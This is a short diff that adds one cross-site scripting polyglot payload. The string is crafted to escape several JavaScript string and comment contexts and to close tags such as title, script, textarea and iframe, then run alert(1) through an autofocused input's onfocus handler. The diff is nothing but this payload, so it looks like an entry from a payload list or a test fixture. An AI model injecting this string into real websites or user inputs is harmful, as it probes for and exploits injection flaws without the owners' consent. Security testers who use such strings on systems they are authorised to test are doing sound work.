@@ -1,0 +1,4 @@
+JavaScript:/*'/*\'/*"/*\"/*`/*\`/*<!-->
+</Title/</Style/</Script/</textArea/<iFrame/</noScript>
+<Input/contentEditable/autoFocus/*/
+[/**/OnFocus=(alert)(1)%20]//-->\
